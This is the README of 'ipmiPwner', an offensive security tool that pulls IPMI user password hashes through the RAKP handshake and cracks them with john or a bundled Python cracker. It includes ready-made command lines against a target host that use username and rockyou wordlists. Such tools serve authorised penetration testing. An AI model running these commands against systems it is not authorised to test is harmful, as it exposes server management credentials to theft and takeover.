# ipmiPwner
This exploit dump the user hash provided through the use of ipmitool. Dumps IPMI user hashes via the RAKP authentication handshake.

The script includes a built-in list of common usernames. If no user is specified it iterates the full list; you can also provide a custom wordlist.


## Dependencies

- ipmitool: `sudo apt install ipmitool`
- Python 3

## Setup

```sh
pip3 install -r requirements.txt
```

## Usage

```sh
# Help
python3 ipmipwner.py -h
# Example
python3 ipmipwner.py --host 192.168.1.12 -oH hash.txt
```

## Parameters

- `--help`  : Displays the help panel

**Required Arguments**

- `--host`  : Target host IP

**Cracking Arguments**

- `-c`      : Cracking tool: `john` | `python` (requires `-pW` and `-oH`)
- `-uW`     : User wordlist (defaults to built-in list)
- `-pW`     : Password wordlist
- `-oH`     : Output hash file
- `-oC`     : Output cracked hash file (required for `-c python`)

**Optional Arguments**

- `-p`      : Port, default: 623
- `-u`      : Single target user
- `-d`      : Delay between requests in seconds, default: 20
- `-r`      : Retry attempts per user, default: 2

## rakpcrk.py

Pure Python RAKP hash cracker. Used internally by `ipmipwner.py` when `-c python` is selected, but can also be run standalone:

```sh
python rakpcrk.py -f hash-example.txt -w wordlist.txt -o hash-cracked.txt
```

- `-f` : Hash file (output from `ipmipwner.py -oH`)
- `-w` : Password wordlist
- `-o` : Output file for the cracked result
- `-l` : Print progress every N lines, default: 1,000,000

## Examples

```sh
python3 ipmipwner.py --host 192.168.1.12 -oH hash
python3 ipmipwner.py --host 192.168.1.12 -c john -oH hash -pW /usr/share/wordlists/rockyou.txt
python3 ipmipwner.py --host 192.168.1.12 -uW /opt/SecLists/Usernames/cirt-default-usernames.txt -oH hash
python3 ipmipwner.py --host 192.168.1.12 -u root -c john -pW /usr/share/wordlists/rockyou.txt -oH hash
python3 ipmipwner.py --host 192.168.1.12 -p 624 -uW /opt/SecLists/Usernames/cirt-default-usernames.txt -c python -pW /usr/share/wordlists/rockyou.txt -oH hash -oC crackedHash
```

## Collaboration

```sh
# Setup automatic lints & dev tools
pip install -r requirements-dev.txt
pre-commit install
pre-commit install --hook-type pre-commit
pre-commit install --hook-type commit-msg

# Manual lints cleaning
python scripts/ruff_fix.py $(find . -name "*.py" -not -path "./.git/*")

# Preview next release version (optional)
semantic-release version --print
# Avoid Warning
GH_TOKEN=local semantic-release version --print
```

### Commit format — versions follow `major.minor.patch`:

| Type        | Version bump      | Description       
|-------------|-------------------|-------------------
| `feat!:`    | major (**X**.0.0) | breaking change
| `feat:`     | minor (0.**X**.0) | new functionality
| `fix:`      | patch (0.0.**X**) | bug fix
| `sec:`      | patch (0.0.**X**) | security fix
| `refactor:` | patch (0.0.**X**) | code improvement, no behavior change
| `docs:`     | patch (0.0.**X**) | documentation only
| `chore:`    | patch (0.0.**X**) | project/config changes

**Example commits**
```sh
# Valid
git commit -m "chore: remove sudo requirement"

# Invalid
git commit -m "remove sudo requirement"
```